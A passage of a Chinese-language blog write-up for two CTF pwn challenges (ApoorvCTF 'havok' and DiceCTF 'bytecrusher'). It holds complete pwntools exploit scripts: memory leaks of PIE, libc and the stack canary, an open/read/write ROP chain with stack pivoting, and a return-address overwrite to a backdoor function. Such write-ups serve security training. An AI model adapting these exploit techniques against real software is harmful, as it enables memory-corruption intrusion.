+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./havok&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;chals1.apoorvctf.xyz&#x27;, 5001)</span><br>elf = ELF(<span class="hljs-string">&#x27;./havok&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>MAIN_OFFSET = <span class="hljs-number">0x17e0</span><br>PUTS_OFFSET = libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>LEAVE_RET_OFF = <span class="hljs-number">0x1224</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;Probe a ring-energy slot&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;65535&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Ring--1 energy: 0x&quot;</span>)<br>leaked_main = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br>pie_base = leaked_main - MAIN_OFFSET<br>p.recvuntil(<span class="hljs-string">b&quot;label for this ring reading:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;x&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Probe a ring-energy slot&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;65534&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Ring--2 energy: 0x&quot;</span>)<br>leaked_puts = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br>libc_base = leaked_puts - PUTS_OFFSET<br>p.recvuntil(<span class="hljs-string">b&quot;label for this ring reading:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;x&quot;</span>)<br><br>log.success(<span class="hljs-string">f&quot;leaked main  = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leaked_main)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;PIE  base    = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pie_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;leaked puts  = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leaked_puts)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;libc base    = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>leave_ret   = pie_base + LEAVE_RET_OFF<br>plasma_sig  = pie_base + <span class="hljs-number">0x4060</span><br>open_addr  = libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>] + libc_base<br>read_addr  = libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base<br>write_addr = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi; ret&#x27;</span>))) + libc_base<br>flag_str    = plasma_sig + <span class="hljs-number">0xc0</span><br>read_buf    = plasma_sig + <span class="hljs-number">0xd0</span><br>pop_rdx = libc_base + <span class="hljs-number">0xd6ffd</span><br>ret_gadget = pie_base + <span class="hljs-number">0x101a</span><br>xchg = libc_base + <span class="hljs-number">0x181fe1</span><br><br>log.success(<span class="hljs-string">f&quot;plasma_sig  = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(plasma_sig)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;leave_ret   = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leave_ret)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;pop_rdi     = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pop_rdi)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;pop_rsi     = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pop_rsi)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;open        = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(open_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;read        = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;write       = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;pop_rdx       = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pop_rdx)&#125;</span>&quot;</span>)<br><br>rop  = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-comment"># open</span><br>rop += p64(pop_rdi) + p64(flag_str)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(ret_gadget)<br>rop += p64(open_addr)<br><span class="hljs-comment"># read</span><br>rop += p64(xchg)<br>rop += p64(pop_rsi) + p64(read_buf)<br>rop += p64(pop_rdx) + p64(<span class="hljs-number">0x50</span>)<br>rop += p64(ret_gadget)<br>rop += p64(read_addr)<br><span class="hljs-comment"># write</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>rop += p64(pop_rsi) + p64(read_buf)<br>rop += p64(pop_rdx) + p64(<span class="hljs-number">0x50</span>)<br>rop += p64(ret_gadget)<br>rop += p64(write_addr)<br><br>payload_plasma  = p64(<span class="hljs-number">0</span>)<br>payload_plasma += rop<br>payload_plasma  = payload_plasma.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload_plasma += <span class="hljs-string">b&quot;./flag.txt\x00&quot;</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;Upload Plasma Signature&quot;</span>)<br><br>p.send(payload_plasma)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Confirm injection key:&quot;</span>)<br>payload_confirm  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span><br>payload_confirm += p64(plasma_sig)<br>payload_confirm += p64(leave_ret)<br><br>p.send(payload_confirm)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>需要注意的是，不要忘了加个<code>ret gadget</code>以保证<strong>栈16字节对齐</strong>以避免程序crash</p>
+<p>一开始我本地将fd默认为3打通了，远程就是打不通</p>
+<p>最后将其改为<code>xchg rax rdi ret</code></p>
+<p>终于拿下</p>
+<p>还是细节决定成败啊…</p>
+<h2 id="2-DiceCTF-bytecrusher"><a href="#2-DiceCTF-bytecrusher" class="headerlink" title="2.DiceCTF bytecrusher"></a>2.DiceCTF bytecrusher</h2><p>直接看题目吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to ByteCrusher, dicegang\&#x27;s new proprietary text crusher!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We are happy to offer sixteen free trials of our premium service.&quot;</span>);<br>  free_trial();<br>  get_feedback();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nThank you for trying ByteCrusher! We hope you enjoyed it.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_trial</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_68;<br>  uint local_64;<br>  <span class="hljs-type">int</span> local_60;<br>  <span class="hljs-type">int</span> local_5c;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">32</span>];<br>  <span class="hljs-type">char</span> local_38 [<span class="hljs-number">40</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  local_60 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0xf</span> &lt; local_60) &#123;<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Trial %d/16:\n&quot;</span>,(ulong)(local_60 + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter a string to crush:&quot;</span>);<br>    fgets(local_58,<span class="hljs-number">0x20</span>,<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter crush rate:&quot;</span>);<br>    __isoc99_scanf(&amp;DAT_00102078,&amp;local_68);<br>    <span class="hljs-keyword">if</span> (local_68 &lt; <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid crush rate, using default of 1.&quot;</span>);<br>      local_68 = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter output length:&quot;</span>);<br>    __isoc99_scanf(&amp;DAT_00102078,&amp;local_64);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x20</span> &lt; local_64) &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Output length too large, using max size.&quot;</span>);<br>      local_64 = <span class="hljs-number">0x20</span>;<br>    &#125;<br>    <span class="hljs-keyword">do</span> &#123;<br>      local_5c = getchar();<br>      <span class="hljs-keyword">if</span> (local_5c == <span class="hljs-number">10</span>) <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> (local_5c != <span class="hljs-number">-1</span>);<br>    crush_string(local_58,local_38,local_68,local_64);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Crushed string:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(local_38);<br>    local_60 = local_60 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">get_feedback</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_28 [<span class="hljs-number">24</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter some text:&quot;</span>);<br>  gets(local_28);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your feedback has been recorded and totally not thrown away.&quot;</span>);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在溢出</p>
+<p>存在后门函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">admin_portal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  FILE *__stream;<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome dicegang admin!&quot;</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag file not found&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>      iVar1 = fgetc(__stream);<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)iVar1 == <span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">putchar</span>((<span class="hljs-type">int</span>)(<span class="hljs-type">char</span>)iVar1);<br>    &#125;<br>    fclose(__stream);<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>利用<code>free_trial</code>的漏洞每次泄露1字节得到pie_base和canary</p>
+<p>最后溢出覆盖返回地址为backdoor即可</p>
+<p>下面是<strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./bytecrusher&#x27;</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = remote(&#x27;bytecrusher.chals.dicec.tf&#x27;, 1337)</span><br>p = process(<span class="hljs-string">&#x27;./bytecrusher&#x27;</span>)<br><br><br>CANARY_OFFSET = <span class="hljs-number">72</span><br>RET_OFFSET    = <span class="hljs-number">88</span><br><br><br>trial = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_trial</span>(<span class="hljs-params">data, rate, out_len</span>):<br>    <span class="hljs-keyword">global</span> trial<br>    trial += <span class="hljs-number">1</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter a string to crush:\n&#x27;</span>)<br>    p.send(data)<br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter crush rate:\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(rate).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter output length:\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(out_len).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;Crushed string:\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.recvline(keepends=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_byte</span>(<span class="hljs-params">offset</span>):<br>    raw = do_trial(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">31</span>, offset, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">return</span> raw[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(raw) &gt;= <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0x00</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;trials of our premium service.\n&#x27;</span>)<br><br><span class="hljs-comment"># 泄漏 canary</span><br>log.info(<span class="hljs-string">&#x27;Leaking canary...&#x27;</span>)<br>canary_bytes = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>    canary_bytes[k] = leak_byte(CANARY_OFFSET + k)<br>canary = u64(<span class="hljs-built_in">bytes</span>(canary_bytes))<br>log.success(<span class="hljs-string">f&#x27;Canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 泄漏 pie base</span><br>log.info(<span class="hljs-string">&#x27;Leaking PIE base...&#x27;</span>)<br>ret_bytes = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    ret_bytes[k] = leak_byte(RET_OFFSET + k)<br>ret_addr = u64(<span class="hljs-built_in">bytes</span>(ret_bytes))<br>log.success(<span class="hljs-string">f&#x27;Ret addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ret_addr)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 计算 backdoor</span><br>pie_base     = ret_addr - elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>] - <span class="hljs-number">108</span><br>admin_portal = pie_base + elf.sym[<span class="hljs-string">&#x27;admin_portal&#x27;</span>]<br>log.success(<span class="hljs-string">f&#x27;PIE base:     <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)<br>log.success(<span class="hljs-string">f&#x27;admin_portal: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(admin_portal)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">assert</span> pie_base &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span>, <span class="hljs-string">f&#x27;PIE base 不对齐: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pie_base)&#125;</span>&#x27;</span><br><br><span class="hljs-keyword">while</span> trial &lt; <span class="hljs-number">16</span>:<br>    do_trial(<span class="hljs-string">b&#x27;X\n&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># stack overflow</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Enter some text:\n&#x27;</span>)<br>payload  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">24</span><br>payload += p64(canary)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(admin_portal)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢阅读</p>
+<p>生活愉快…</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        
+        
+          <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="print-no-link">#栈迁移</a>
+        
+      
+        
+        
+          <a href="/tags/ORW/" class="print-no-link">#ORW</a>
+        
+      
+        
+        
+          <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
+        
+      
+        
+        
+          <a href="/tags/stack-overflow/" class="print-no-link">#stack overflow</a>
+        
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ApoorvCTF&amp;DiceCTF 2026 pwns</div>
+      <div>https://rr00xxyy.github.io/2026/03/09/ApoorvCTF-DiceCTF-2026-pwns/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>roxy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月9日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年4月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/25/OS%E9%9A%8F%E8%AE%B0/" title="OS随记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OS随记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/06/sort/" title="sort?">
+                        <span class="hidden-mobile">sort?</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span class="footer-quote">It is no use crying over spilt milk</span>
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
